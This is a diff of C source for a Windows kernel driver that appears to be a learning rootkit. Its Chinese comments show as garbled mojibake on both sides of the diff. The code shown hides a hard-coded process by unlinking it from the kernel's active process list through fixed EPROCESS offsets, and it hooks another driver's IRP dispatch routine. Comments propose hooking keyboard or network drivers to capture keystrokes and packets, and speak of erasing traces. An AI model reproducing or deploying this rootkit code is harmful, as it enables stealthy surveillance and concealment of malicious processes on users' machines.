@@ -1,3 +1,9 @@
+/********************************************
+description
+
+
+
+********************************************/
 #include "ntddk.h"
 #include "datatype.h"
 #include "dbgmsg.h"
@@ -5,12 +11,12 @@
 #include "device.h"
 //#include "iomgr.h"
 
-// Ê¹ÓÃ build  /D /g /b /B /e /F /S /s /$ /why /v /w /y  ÃüÁî±àÒë¸ÃÇı¶¯Ô´ÎÄ¼ş
+// ä½¿ç”¨ build  /D /g /b /B /e /F /S /s /$ /why /v /w /y  å‘½ä»¤ç¼–è¯‘è¯¥é©±åŠ¨æºæ–‡ä»¶
 //#define MEM_TAG  "UseForCopyFile"
-// ×¢Òâ£º´ËÇı¶¯Í¨¹ısc.exe¼ÓÔØÖÁÄÚºË¿Õ¼äÊ±£¬»áÊ¹ÓÃ×ÔÉíÊµÏÖµÄÍ¬²½»úÖÆÀ´·ÃÎÊÈ«¾ÖµÄ»î¶¯½ø³ÌÁ´±í£¬È»ºóÒş²Ø
-//Ó²±àÂëÔÚÄÚ²¿µÄÃû³ÆÀ´Òş²ØÌØ¶¨½ø³Ì£¬µ«´ËÇı¶¯Ğ¶ÔØÊ±²¢²»»á»¹Ô­¶ÔÁ´±íµÄĞŞ¸Ä£¬Òò´Ë²»»áÖØÏÖÄ¿±ê½ø³Ì¡£ĞèÒª±àĞ´ÁíÍâµÄÂß¼­ÔÚ
-// Çı¶¯Ğ¶ÔØÊ±ÖØÏÖÒş²ØµÄ½ø³Ì£¨»òÕßÖØÆôÏµÍ³Ò²¿ÉÒÔ£©
-//ĞèÒªÔÚ¶àºËÏµÍ³ÉÏ²âÊÔ´ËÇı¶¯µÄ»¥³â·ÃÎÊÂß¼­ÊÇ·ñÄÜ¹»Õı³£ÔË×÷£¬·´Ö®Ôò»áµ¼ÖÂbugcheckÀ¶ÆÁ
+// æ³¨æ„ï¼šæ­¤é©±åŠ¨é€šè¿‡sc.exeåŠ è½½è‡³å†…æ ¸ç©ºé—´æ—¶ï¼Œä¼šä½¿ç”¨è‡ªèº«å®ç°çš„åŒæ­¥æœºåˆ¶æ¥è®¿é—®å…¨å±€çš„æ´»åŠ¨è¿›ç¨‹é“¾è¡¨ï¼Œç„¶åéšè—
+//ç¡¬ç¼–ç åœ¨å†…éƒ¨çš„åç§°æ¥éšè—ç‰¹å®šè¿›ç¨‹ï¼Œä½†æ­¤é©±åŠ¨å¸è½½æ—¶å¹¶ä¸ä¼šè¿˜åŸå¯¹é“¾è¡¨çš„ä¿®æ”¹ï¼Œå› æ­¤ä¸ä¼šé‡ç°ç›®æ ‡è¿›ç¨‹ã€‚éœ€è¦ç¼–å†™å¦å¤–çš„é€»è¾‘åœ¨
+// é©±åŠ¨å¸è½½æ—¶é‡ç°éšè—çš„è¿›ç¨‹ï¼ˆæˆ–è€…é‡å¯ç³»ç»Ÿä¹Ÿå¯ä»¥ï¼‰
+//éœ€è¦åœ¨å¤šæ ¸ç³»ç»Ÿä¸Šæµ‹è¯•æ­¤é©±åŠ¨çš„äº’æ–¥è®¿é—®é€»è¾‘æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸è¿ä½œï¼Œåä¹‹åˆ™ä¼šå¯¼è‡´bugcheckè“å±
 
 #define IopAllocateOpenPacket()                                              \
     ExAllocatePoolWithTag( NonPagedPool,                                     \
@@ -18,16 +24,16 @@
                            'pOoI')
 
 
-#define EPROCESS_OFFSET_PID				0xb4		//¼´ EPROCESS.UniqueProcessId £¬Æ«ÒÆÁ¿Îª 0xb4 ×Ö½Ú
-#define EPROCESS_OFFSET_NAME				0x16c		//¼´ EPROCESS.ImageFileName £¬Æ«ÒÆÁ¿Îª 0x16c ×Ö½Ú
-#define EPROCESS_OFFSET_LINKS				0xb8			//¼´ EPROCESS.ActiveProcessLinks £¬Æ«ÒÆÁ¿Îª 0xb8 ×Ö½Ú
-#define SZ_EPROCESS_NAME					0x010	// Ô­Ê¼ÎÄµµ¶¨ÒåÖĞ£¬½ø³ÌÃû³Æ´æ´¢ÔÚ³¤¶ÈÎª15¸ö×Ö½Ú×Ö·ûÊı×éÖĞ£¬
-// ÕâÀï°Ñ³¤¶È¸ÃÎª16ÊÇÎªÁË°Ñ×îºóÒ»¸öÔªËØ¸³ÖµÎª\0½áÎ²±êÖ¾
-//ÆäÊµÎŞĞèÈç´Ë£¬ÒòÎª½ø³Ì¼ÓÔØÊ±£¬ÄÚºË»á×Ô¶¯°ÑÓ³ÏñÃû³Æ½Ø¶Ï³É14×Ö½Ú£¬È»ºóÌî³äµ½ _EPROCESS.ImageFileName[] ×Ö¶Î£¨³¤¶È15×Ö½Ú£©£¬
-//µÚ15×Ö½Ú£¨_EPROCESS.ImageFileName[14]£©Ìî³äÎª\0
+#define EPROCESS_OFFSET_PID				0xb4		//å³ EPROCESS.UniqueProcessId ï¼Œåç§»é‡ä¸º 0xb4 å­—èŠ‚
+#define EPROCESS_OFFSET_NAME				0x16c		//å³ EPROCESS.ImageFileName ï¼Œåç§»é‡ä¸º 0x16c å­—èŠ‚
+#define EPROCESS_OFFSET_LINKS				0xb8			//å³ EPROCESS.ActiveProcessLinks ï¼Œåç§»é‡ä¸º 0xb8 å­—èŠ‚
+#define SZ_EPROCESS_NAME					0x010	// åŸå§‹æ–‡æ¡£å®šä¹‰ä¸­ï¼Œè¿›ç¨‹åç§°å­˜å‚¨åœ¨é•¿åº¦ä¸º15ä¸ªå­—èŠ‚å­—ç¬¦æ•°ç»„ä¸­ï¼Œ
+// è¿™é‡ŒæŠŠé•¿åº¦è¯¥ä¸º16æ˜¯ä¸ºäº†æŠŠæœ€åä¸€ä¸ªå…ƒç´ èµ‹å€¼ä¸º\0ç»“å°¾æ ‡å¿—
+//å…¶å®æ— éœ€å¦‚æ­¤ï¼Œå› ä¸ºè¿›ç¨‹åŠ è½½æ—¶ï¼Œå†…æ ¸ä¼šè‡ªåŠ¨æŠŠæ˜ åƒåç§°æˆªæ–­æˆ14å­—èŠ‚ï¼Œç„¶åå¡«å……åˆ° _EPROCESS.ImageFileName[] å­—æ®µï¼ˆé•¿åº¦15å­—èŠ‚ï¼‰ï¼Œ
+//ç¬¬15å­—èŠ‚ï¼ˆ_EPROCESS.ImageFileName[14]ï¼‰å¡«å……ä¸º\0
 
 //extern POBJECT_TYPE* IoDriverObjectType;
-//ÏÂÃæÁ½¸öÀàĞÍÓëÒ»¸öÀı³ÌÊÇ ntddk ÖĞÎ´¶¨ÒåµÄ£¬µ« Windows ÄÚºËÈ·Êµµ¼³öÁËËüÃÇµÄ·ûºÅ£¬Òò´ËÖ»ĞèÓÃ extern ÉùÃ÷£¬¼´¿É¸æÖªÁ´½ÓÆ÷½âÎö·ûºÅ
+//ä¸‹é¢ä¸¤ä¸ªç±»å‹ä¸ä¸€ä¸ªä¾‹ç¨‹æ˜¯ ntddk ä¸­æœªå®šä¹‰çš„ï¼Œä½† Windows å†…æ ¸ç¡®å®å¯¼å‡ºäº†å®ƒä»¬çš„ç¬¦å·ï¼Œå› æ­¤åªéœ€ç”¨ extern å£°æ˜ï¼Œå³å¯å‘ŠçŸ¥é“¾æ¥å™¨è§£æç¬¦å·
 
 
 
@@ -47,9 +53,9 @@ extern NTSTATUS ObReferenceObjectByName(
 
 
 
-/* MSNetDigaDeviceObject´ú±íÎÒÃÇ´´½¨µÄÉè±¸ */
+/* MSNetDigaDeviceObjectä»£è¡¨æˆ‘ä»¬åˆ›å»ºçš„è®¾å¤‡ */
 PDEVICE_OBJECT MSNetDiagDeviceObject;
-/* DriverObjectRef´ú±íÎÒÃÇ×¢²áµÄÇı¶¯ */
+/* DriverObjectRefä»£è¡¨æˆ‘ä»¬æ³¨å†Œçš„é©±åŠ¨ */
 PDRIVER_OBJECT DriverObjectRef;
 KIRQL  RaiseIRQL();
 PKDPC  AcquireLock();
@@ -75,9 +81,9 @@ NTSTATUS ReferenceDeviceAndHookIRPdispatchRoutine();
 VOID UnhookIRPdispatchRoutineAndDereferenceDevice();
 NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
 
-//Õâ¼¸¸ö×÷ÎªÈ«¾Ö±äÁ¿£¬·ñÔòÎŞ·¨Í¨¹ı±àÒë£¨±¨´í£º¾Ö²¿±äÁ¿Î´³õÊ¼»¯£©
+//è¿™å‡ ä¸ªä½œä¸ºå…¨å±€å˜é‡ï¼Œå¦åˆ™æ— æ³•é€šè¿‡ç¼–è¯‘ï¼ˆæŠ¥é”™ï¼šå±€éƒ¨å˜é‡æœªåˆå§‹åŒ–ï¼‰
 
-//¶¨ÒåÒ»¸öÈ«¾ÖµÄº¯ÊıÖ¸Õë£¬¸ø¹Ò¹³Àı³ÌĞŞ¸Ä£¬½â¹³Àı³Ì»¹Ô­Ä¿±êÇı¶¯ÓÃÀ´´¦ÀíÌØ¶¨ IRP µÄ·Ö·¢Àı³Ì
+//å®šä¹‰ä¸€ä¸ªå…¨å±€çš„å‡½æ•°æŒ‡é’ˆï¼Œç»™æŒ‚é’©ä¾‹ç¨‹ä¿®æ”¹ï¼Œè§£é’©ä¾‹ç¨‹è¿˜åŸç›®æ ‡é©±åŠ¨ç”¨æ¥å¤„ç†ç‰¹å®š IRP çš„åˆ†å‘ä¾‹ç¨‹
 
 typedef NTSTATUS (*OriginalDispatchRoutinePtr)
 (
@@ -207,7 +213,7 @@ typedef struct _OPEN_PACKET {
 POPEN_PACKET openPacket;
 
 
-//ÏÂÃæÕâÈı¸öÈ«¾Ö±äÁ¿¹©¹Ò¹³ºÍ½â¹³Àı³ÌÒıÓÃÓë½âÒıÄ¿±êÇı¶¯ºÍÉè±¸¶ÔÏó
+//ä¸‹é¢è¿™ä¸‰ä¸ªå…¨å±€å˜é‡ä¾›æŒ‚é’©å’Œè§£é’©ä¾‹ç¨‹å¼•ç”¨ä¸è§£å¼•ç›®æ ‡é©±åŠ¨å’Œè®¾å¤‡å¯¹è±¡
 
 PFILE_OBJECT			ref_file;
 PDEVICE_OBJECT			ref_device;
@@ -217,21 +223,21 @@ PDRIVER_OBJECT			ref_driver;
 KIRQL  old_irql;
 
 
-//Èç¹û×÷ÎªÈ«¾Ö±äÁ¿¶¨Òå³öÏÖÎÊÌâ£¬Ôò°ÑËüÃÇÒÆÖÁ DriverEntry() ÖĞ¶¨Òå
-//unsigned char*  target_hide_process_name_null_terminated = ¡°QQProtect.exe\0¡±;
+//å¦‚æœä½œä¸ºå…¨å±€å˜é‡å®šä¹‰å‡ºç°é—®é¢˜ï¼Œåˆ™æŠŠå®ƒä»¬ç§»è‡³ DriverEntry() ä¸­å®šä¹‰
+//unsigned char*  target_hide_process_name_null_terminated = â€œQQProtect.exe\0â€;
 
 //unsigned char*  target_hide_process_name = "QQProtect.exe";
 unsigned char*  target_hide_process_name = "Core Temp.exe";
-// ÏÂÃæµÄ3¸öÈ«¾Ö±äÁ¿ÓÃÓÚÔÚ¶à´¦ÀíÆ÷ÏµÍ³ÉÏÍ¬²½¶ÔOS×ÊÔ´µÄ·ÃÎÊ
+// ä¸‹é¢çš„3ä¸ªå…¨å±€å˜é‡ç”¨äºåœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸ŠåŒæ­¥å¯¹OSèµ„æºçš„è®¿é—®
 
-PKDPC  dpcPointer;		//Ò»¸öÖ¸Õë£¬Ö¸ÏòÓÉ DPC£¨ÑÓ³Ù¹ı³Ìµ÷ÓÃ£©¶ÔÏó¹¹³ÉµÄÊı×é£»Ã¿´¦ÀíÆ÷/ºË±»·ÖÅäÒ»¸ö´ËÀàÊı×é£»Ã¿´¦ÀíÆ÷ÉÏµÄ DPC
-					// Àı³ÌÔËĞĞÔÚ DISPATCH_LEVEL ¼¶£¬Òò´Ë¿ÉÒÔ¹ÒÆğ¸Ã´¦ÀíÆ÷/ºËÉÏÔËĞĞµÄ OSµÄÏß³Ìµ÷¶È´úÂëÊµÏÖÍ¬²½¡£
-DWORD has_finished_access_os_res;		//µ±Íê³É¶ÔOS×ÊÔ´µÄÍ¬²½·ÃÎÊÊ±£¬Ó¦½«´Ë±êÖ¾ÖÃ1
-DWORD nCPUsLocked;		//±êÊ¶µ±Ç°±»Í¬²½ÁËµÄ£¨ÔËĞĞÔÚ DISPATCH_LEVEL£©CPU/ºËÊıÁ¿£¬´Ë±äÁ¿Ó¦¸ÃÍ¨¹ı InterLocked*() ÏµÁĞÀı³ÌÔ­×ÓµØ½øĞĞ¶ÁĞ´
-					// ÉùÃ÷Ò»¸öÎ»ÓÚÍâ²¿»ã±àÔ´ÎÄ¼ş£¨.../amd64/lib.asm£©ÖĞµÄº¯Êı£¬Ëü½ö½öÖ´ĞĞ nop ¿ÕÖ¸Áî
+PKDPC  dpcPointer;		//ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ç”± DPCï¼ˆå»¶è¿Ÿè¿‡ç¨‹è°ƒç”¨ï¼‰å¯¹è±¡æ„æˆçš„æ•°ç»„ï¼›æ¯å¤„ç†å™¨/æ ¸è¢«åˆ†é…ä¸€ä¸ªæ­¤ç±»æ•°ç»„ï¼›æ¯å¤„ç†å™¨ä¸Šçš„ DPC
+					// ä¾‹ç¨‹è¿è¡Œåœ¨ DISPATCH_LEVEL çº§ï¼Œå› æ­¤å¯ä»¥æŒ‚èµ·è¯¥å¤„ç†å™¨/æ ¸ä¸Šè¿è¡Œçš„ OSçš„çº¿ç¨‹è°ƒåº¦ä»£ç å®ç°åŒæ­¥ã€‚
+DWORD has_finished_access_os_res;		//å½“å®Œæˆå¯¹OSèµ„æºçš„åŒæ­¥è®¿é—®æ—¶ï¼Œåº”å°†æ­¤æ ‡å¿—ç½®1
+DWORD nCPUsLocked;		//æ ‡è¯†å½“å‰è¢«åŒæ­¥äº†çš„ï¼ˆè¿è¡Œåœ¨ DISPATCH_LEVELï¼‰CPU/æ ¸æ•°é‡ï¼Œæ­¤å˜é‡åº”è¯¥é€šè¿‡ InterLocked*() ç³»åˆ—ä¾‹ç¨‹åŸå­åœ°è¿›è¡Œè¯»å†™
+					// å£°æ˜ä¸€ä¸ªä½äºå¤–éƒ¨æ±‡ç¼–æºæ–‡ä»¶ï¼ˆ.../amd64/lib.asmï¼‰ä¸­çš„å‡½æ•°ï¼Œå®ƒä»…ä»…æ‰§è¡Œ nop ç©ºæŒ‡ä»¤
 
-					// ¸ÃÎÄ¼ş½öÓÃÓÚÎª AMD64 ÌåÏµ½á¹¹£¨Ö¸¶¨ÁË /amd64 ¹¹½¨Ñ¡ÏîÊ±ÓÃ£©£¬¶ÔÓÚÄ¬ÈÏµÄ x86/i386 ¹¹½¨Ñ¡Ïî£¬ÎŞĞèÉùÃ÷¸ÃÍâ²¿º¯Êı£¬
-					// ¶øÊÇÓÃÄÚÁª»ã±àÓï¾ä __asm{nop;}
+					// è¯¥æ–‡ä»¶ä»…ç”¨äºä¸º AMD64 ä½“ç³»ç»“æ„ï¼ˆæŒ‡å®šäº† /amd64 æ„å»ºé€‰é¡¹æ—¶ç”¨ï¼‰ï¼Œå¯¹äºé»˜è®¤çš„ x86/i386 æ„å»ºé€‰é¡¹ï¼Œæ— éœ€å£°æ˜è¯¥å¤–éƒ¨å‡½æ•°ï¼Œ
+					// è€Œæ˜¯ç”¨å†…è”æ±‡ç¼–è¯­å¥ __asm{nop;}
 					
 
 VOID Unload(IN PDRIVER_OBJECT DriverObject)
@@ -242,10 +248,10 @@ VOID Unload(IN PDRIVER_OBJECT DriverObject)
 
 	DBG_TRACE("OnUnload", "First remove IRP hook and dereference target device");
 
-	// Ğ¶ÔØ×Ô¼ºÇ°£¬ÏÈÒÆ³ı¹ÒÔÚÈË¼ÒÉÏµÄ¹³×Ó²¢½âÒıÈË¼ÒµÄÉè±¸¶ÔÏó£¬ÕâÑùÈË¼Ò²ÅÄÜĞ¶ÔØ¡£ÎŞĞèÅĞ¶ÏÊÇ·ñ½âÒı³É¹¦
+	// å¸è½½è‡ªå·±å‰ï¼Œå…ˆç§»é™¤æŒ‚åœ¨äººå®¶ä¸Šçš„é’©å­å¹¶è§£å¼•äººå®¶çš„è®¾å¤‡å¯¹è±¡ï¼Œè¿™æ ·äººå®¶æ‰èƒ½å¸è½½ã€‚æ— éœ€åˆ¤æ–­æ˜¯å¦è§£å¼•æˆåŠŸ
 	UnhookIRPdispatchRoutineAndDereferenceDevice();
 
-	// È»ºóĞ¶ÔØ×Ô¼º
+	// ç„¶åå¸è½½è‡ªå·±
 	DBG_TRACE("OnUnload", "Received signal to unload the driver");
 	pdeviceObj = (*DriverObject).DeviceObject;
 	if (pdeviceObj != NULL)
@@ -267,15 +273,15 @@ VOID Unload(IN PDRIVER_OBJECT DriverObject)
 }
 
 
-//¸Ãº¯ÊıÊ×ÏÈÈ¥µô¹³×Ó£¬»¹Ô­µ½³õÊ¼µÄ·Ö·¢Àı³Ì£¬È»ºó½âÒıÓÃÄ¿±êÉè±¸¶ÔÏó
-//ÒòÎªÊµ¼ÊÖ´ĞĞ½âÒıÓÃµÄ ObDereferenceObject() Ò»¶¨³É¹¦£¨ËüÎŞ·µ»ØÖµ£©£¬ËùÒÔÎÒÃÇµÄ·â×°º¯ÊıÒ²ÎŞĞè·µ»ØÖµ£¬´Ó¶øÔÚÎÒÃÇµÄ
-// unload() Àı³ÌÖĞÎŞĞèÅĞ¶Ï½âÒıÄ¿±êÉè±¸¶ÔÏóÊÇ·ñ³É¹¦¡£¡£¡£¡£
+//è¯¥å‡½æ•°é¦–å…ˆå»æ‰é’©å­ï¼Œè¿˜åŸåˆ°åˆå§‹çš„åˆ†å‘ä¾‹ç¨‹ï¼Œç„¶åè§£å¼•ç”¨ç›®æ ‡è®¾å¤‡å¯¹è±¡
+//å› ä¸ºå®é™…æ‰§è¡Œè§£å¼•ç”¨çš„ ObDereferenceObject() ä¸€å®šæˆåŠŸï¼ˆå®ƒæ— è¿”å›å€¼ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å°è£…å‡½æ•°ä¹Ÿæ— éœ€è¿”å›å€¼ï¼Œä»è€Œåœ¨æˆ‘ä»¬çš„
+// unload() ä¾‹ç¨‹ä¸­æ— éœ€åˆ¤æ–­è§£å¼•ç›®æ ‡è®¾å¤‡å¯¹è±¡æ˜¯å¦æˆåŠŸã€‚ã€‚ã€‚ã€‚
 
 VOID UnhookIRPdispatchRoutineAndDereferenceDevice() {
 
 	//int loop_counter2;
 
-	//ÏÈ¼ì²éÇ°ÃæÊÇ·ñ±£´æÁËÔ­Ê¼·Ö·¢Àı³Ì
+	//å…ˆæ£€æŸ¥å‰é¢æ˜¯å¦ä¿å­˜äº†åŸå§‹åˆ†å‘ä¾‹ç¨‹
 	if (ori_dispt_ptr != NULL) {
 
 
@@ -291,9 +297,9 @@ VOID UnhookIRPdispatchRoutineAndDereferenceDevice() {
 	}
 
 
-	//Èç¹ûÃ»ÓĞ±£´æ£¬¾ÍÃ»ÓĞ¹Ò¹³£¬µ±È»Ò²²»ÓÃ½â¹³£¬½öĞè½âÒıÓÃºó·µ»Ø
+	//å¦‚æœæ²¡æœ‰ä¿å­˜ï¼Œå°±æ²¡æœ‰æŒ‚é’©ï¼Œå½“ç„¶ä¹Ÿä¸ç”¨è§£é’©ï¼Œä»…éœ€è§£å¼•ç”¨åè¿”å›
 
-	//Èç¹ûÄÜ¹»»ñÈ¡Éè±¸¶ÔÏóÖ¸Õë£¬ÔòÊ¹ÓÃ IoGetDeviceObjectPointer() ·µ»ØµÄÎÄ¼ş¶ÔÏóÀ´½âÒıÓÃ
+	//å¦‚æœèƒ½å¤Ÿè·å–è®¾å¤‡å¯¹è±¡æŒ‡é’ˆï¼Œåˆ™ä½¿ç”¨ IoGetDeviceObjectPointer() è¿”å›çš„æ–‡ä»¶å¯¹è±¡æ¥è§£å¼•ç”¨
 	/*if( ref_file != NULL ){
 	
 		ObDereferenceObject(ref_file);
@@ -305,7 +311,7 @@ VOID UnhookIRPdispatchRoutineAndDereferenceDevice() {
 	}*/
 
 
-	//Ê¹ÓÃ ObReferenceObjectByName() ·µ»ØµÄ¶ÔÏóÖ¸Õë£¨Ö¸Ïò\Driver\QQProtect£©À´½âÒıÓÃ
+	//ä½¿ç”¨ ObReferenceObjectByName() è¿”å›çš„å¯¹è±¡æŒ‡é’ˆï¼ˆæŒ‡å‘\Driver\QQProtectï¼‰æ¥è§£å¼•ç”¨
 	if (ref_device != NULL) {
 
 		ObDereferenceObject(ref_device);
@@ -317,9 +323,9 @@ VOID UnhookIRPdispatchRoutineAndDereferenceDevice() {
 	}
 
 
-	//ÎŞ¹Ò¹³£¬ÎŞÒıÓÃ£¨ori_dispt_ptr == NULL && ref_file == NULL£©
-	// Èç¹ûÁ¬Ç°ÃæµÄ ReferenceDeviceAndHookIRPdispatchRoutine ¶¼ÒıÓÃÉè±¸¶ÔÏó¶¼Ê§°Ü£¨ref_file »áµÈÓÚ NULL£©
-	// ÄÇÃ´Ê²Ã´¶¼²»×ö£¬Ö±½Ó·µ»Ø¸ø unload()£¬ºóÕß¾Í¿ÉÒÔĞ¶ÔØÎÒÃÇ×Ô¼ºµÄÇı¶¯
+	//æ— æŒ‚é’©ï¼Œæ— å¼•ç”¨ï¼ˆori_dispt_ptr == NULL && ref_file == NULLï¼‰
+	// å¦‚æœè¿å‰é¢çš„ ReferenceDeviceAndHookIRPdispatchRoutine éƒ½å¼•ç”¨è®¾å¤‡å¯¹è±¡éƒ½å¤±è´¥ï¼ˆref_file ä¼šç­‰äº NULLï¼‰
+	// é‚£ä¹ˆä»€ä¹ˆéƒ½ä¸åšï¼Œç›´æ¥è¿”å›ç»™ unload()ï¼Œåè€…å°±å¯ä»¥å¸è½½æˆ‘ä»¬è‡ªå·±çš„é©±åŠ¨
 
 	DBG_TRACE("UnhookIRPdispatchRoutineAndDereferenceDevice", "nothing to do....because reference and hook failure.....");
 	return;
@@ -328,8 +334,8 @@ VOID UnhookIRPdispatchRoutineAndDereferenceDevice() {
 
 
 
-//¸Ãº¯ÊıÒıÓÃÄ¿±êÉè±¸¶ÔÏó£¬È»ºó¹Ò¹³¶Ô·½µÄ IRP ·Ö·¢Àı³Ì
-//ÎÒÃÇ¿ÉÒÔ¸ÄÎª hooked ÄÇĞ©Çı¶¯£¨ÀıÈçi8204ptr.sys£©µ¼³öÀ´´¦Àí¶Á/Ğ´ÇëÇóµÄÉè±¸¶ÔÏó·Ö·¢Àı³Ì£¬ÕâÑù¾ÍÄÜ¹»¼àÊÓÊÕ·¢µÄÍøÂçÊı¾İ°ü£¬ÓÃ»§°´ÏÂµÄ°´¼üµÈ
+//è¯¥å‡½æ•°å¼•ç”¨ç›®æ ‡è®¾å¤‡å¯¹è±¡ï¼Œç„¶åæŒ‚é’©å¯¹æ–¹çš„ IRP åˆ†å‘ä¾‹ç¨‹
+//æˆ‘ä»¬å¯ä»¥æ”¹ä¸º hooked é‚£äº›é©±åŠ¨ï¼ˆä¾‹å¦‚i8204ptr.sysï¼‰å¯¼å‡ºæ¥å¤„ç†è¯»/å†™è¯·æ±‚çš„è®¾å¤‡å¯¹è±¡åˆ†å‘ä¾‹ç¨‹ï¼Œè¿™æ ·å°±èƒ½å¤Ÿç›‘è§†æ”¶å‘çš„ç½‘ç»œæ•°æ®åŒ…ï¼Œç”¨æˆ·æŒ‰ä¸‹çš„æŒ‰é”®ç­‰
 
 NTSTATUS	ReferenceDeviceAndHookIRPdispatchRoutine(){
 
@@ -375,8 +381,8 @@ NTSTATUS	ReferenceDeviceAndHookIRPdispatchRoutine(){
 
 	ref_driver =  (*ref_device).DriverObject;
 
-	//ÎÒÃÇ½ö±£´æ²¢ hook Ä¿±êÇı¶¯ÓÃÓÚ´¦Àí IRP_MJ_DEVICE_CONTROL ÀàĞÍ IRP µÄ·Ö·¢Àı³Ì(±íÖĞµÚ 15 ¸öº¯ÊıÖ¸Õë) 
-	// ¶ÔÓÚ QQProtect.sys Ëü³õÊ¼»¯×Ô¼ºµÄ IRP_MJ_CREATE £¬IRP_MJ_CLOSE µÈÀı³Ì£¬Òò´ËÎÒÃÇÑ¡ÆäÒ»À´ hook
+	//æˆ‘ä»¬ä»…ä¿å­˜å¹¶ hook ç›®æ ‡é©±åŠ¨ç”¨äºå¤„ç† IRP_MJ_DEVICE_CONTROL ç±»å‹ IRP çš„åˆ†å‘ä¾‹ç¨‹(è¡¨ä¸­ç¬¬ 15 ä¸ªå‡½æ•°æŒ‡é’ˆ) 
+	// å¯¹äº QQProtect.sys å®ƒåˆå§‹åŒ–è‡ªå·±çš„ IRP_MJ_CREATE ï¼ŒIRP_MJ_CLOSE ç­‰ä¾‹ç¨‹ï¼Œå› æ­¤æˆ‘ä»¬é€‰å…¶ä¸€æ¥ hook
 	//[IRP_MJ_DEVICE_CONTROL]
 	ori_dispt_ptr =  (*ref_driver).MajorFunction[IRP_MJ_CREATE];
 
@@ -395,16 +401,16 @@ NTSTATUS	ReferenceDeviceAndHookIRPdispatchRoutine(){
 
 		DBG_TRACE("ReferenceDeviceAndHookIRPdispatchRoutine", "....... Hook target dispatch routine success ........");
 
-		//ÎªÁËÑéÖ¤ÊÇ·ñ³É¹¦ hook£¬ÕâÀïÎÒÃÇ¼ÓÈëÈí¼şÖĞ¶Ï£¬È»ºóÒÔµ÷ÊÔÆ÷¼ì²é tdx.sys ·Ö·¢Àı³Ì±íÖĞµÄµÚ15¸öº¯ÊıÖ¸Õë£¬·Ö·¢Àı³Ì±íÎ»ÓÚ
-		// Çı¶¯¶ÔÏóÆ«ÒÆ 0x38 ×Ö½Ú´¦£¬¼ÓÉÏ¸ÃÆ«ÒÆÁ¿ºó£¬ÒÔ dps ×ª´¢±íÄÚº¯ÊıÃû£¬ÒòÎªË÷Òı´Ó 0x0 ¿ªÊ¼,Òò´ËÏÂ±ê[0xe] ÊÇµÚ15¸öº¯ÊıÖ¸Õë
-		// ÉÔºóÔÚ¼ÌĞøÖ´ĞĞ²¢ÔÚĞéÄâ»úµÄ sc.exe Ğ¶ÔØÇı¶¯Ê±£¬ÔÙ´Î¶ÏÈëµ÷ÊÔÆ÷£¬¼ì²é¸ÃÀı³ÌÊÇ·ñÒÑ±»»¹Ô­£º
-		// ¹Ò¹³ºó
+		//ä¸ºäº†éªŒè¯æ˜¯å¦æˆåŠŸ hookï¼Œè¿™é‡Œæˆ‘ä»¬åŠ å…¥è½¯ä»¶ä¸­æ–­ï¼Œç„¶åä»¥è°ƒè¯•å™¨æ£€æŸ¥ tdx.sys åˆ†å‘ä¾‹ç¨‹è¡¨ä¸­çš„ç¬¬15ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåˆ†å‘ä¾‹ç¨‹è¡¨ä½äº
+		// é©±åŠ¨å¯¹è±¡åç§» 0x38 å­—èŠ‚å¤„ï¼ŒåŠ ä¸Šè¯¥åç§»é‡åï¼Œä»¥ dps è½¬å‚¨è¡¨å†…å‡½æ•°åï¼Œå› ä¸ºç´¢å¼•ä» 0x0 å¼€å§‹,å› æ­¤ä¸‹æ ‡[0xe] æ˜¯ç¬¬15ä¸ªå‡½æ•°æŒ‡é’ˆ
+		// ç¨ååœ¨ç»§ç»­æ‰§è¡Œå¹¶åœ¨è™šæ‹Ÿæœºçš„ sc.exe å¸è½½é©±åŠ¨æ—¶ï¼Œå†æ¬¡æ–­å…¥è°ƒè¯•å™¨ï¼Œæ£€æŸ¥è¯¥ä¾‹ç¨‹æ˜¯å¦å·²è¢«è¿˜åŸï¼š
+		// æŒ‚é’©å
 		// kd> dps [(866add30+0x38)+ 0xe*4] L2
 		//	866adda0  9300f260 hideprocess!InterceptAndInspectOthersIRP
 		//	866adda4  90c6c2be tdx!TdxTdiDispatchInternalDeviceControl
 
 
-		//½â¹³ºó
+		//è§£é’©å
 		//kd> dps [(866add30+0x38)+ 0xe*4] L2
 		//	866adda0  90c6d332 tdx!TdxTdiDispatchDeviceControl
 		//	866adda4  90c6c2be tdx!TdxTdiDispatchInternalDeviceControl
@@ -417,8 +423,8 @@ NTSTATUS	ReferenceDeviceAndHookIRPdispatchRoutine(){
 
 	
 
-	//Èô±£´æÔ­Ê¼·Ö·¢Àı³ÌÊ§°Ü£¬ÎÒÃÇ¾Í²»ÄÜ hook £¬ÒòÎªÎŞ·¨»¹Ô­À´²Á³ıºÛ¼££¬ÕâÎ¥·´ÁË rootkit µÄÔ­ÔòÖ®Ò»£¡
-	// ÏÂÁ½ÕßÑ¡ÆäÒ»À´±àÒë
+	//è‹¥ä¿å­˜åŸå§‹åˆ†å‘ä¾‹ç¨‹å¤±è´¥ï¼Œæˆ‘ä»¬å°±ä¸èƒ½ hook ï¼Œå› ä¸ºæ— æ³•è¿˜åŸæ¥æ“¦é™¤ç—•è¿¹ï¼Œè¿™è¿åäº† rootkit çš„åŸåˆ™ä¹‹ä¸€ï¼
+	// ä¸‹ä¸¤è€…é€‰å…¶ä¸€æ¥ç¼–è¯‘
 
 	
 	//return  (STATUS_ASSERTION_FAILURE);
@@ -429,25 +435,25 @@ NTSTATUS	ReferenceDeviceAndHookIRPdispatchRoutine(){
 
 
 
-//Èç¹ûÎÒÃÇÓÃ´ËÀı³Ì¹³×¡ÁËQQProtect.sys µÄ IRP_MJ_CREATE ·Ö·¢Àı³Ì£¬ÄÇÃ´ÒªÈçºÎ´¥·¢¶ÔÓ¦µÄ IRP ËÍµ½ÎÒÃÇÕâ´¦ÀíÄØ£¿
-// Èç¹ûÏµÍ³ÉÏÔËĞĞ×Å QQProtect.exe £¬½«Æä¹Ø±Õ£¬È»ºóÆô¶¯ qq.exe Ö÷½ø³Ì£¬ºóÕß»á¼ì²âÇ°ÕßÊÇ·ñ´æÔÚ£¬Èç¹ûÃ»ÓĞ¾Í»á´´½¨ QQProtect.exe
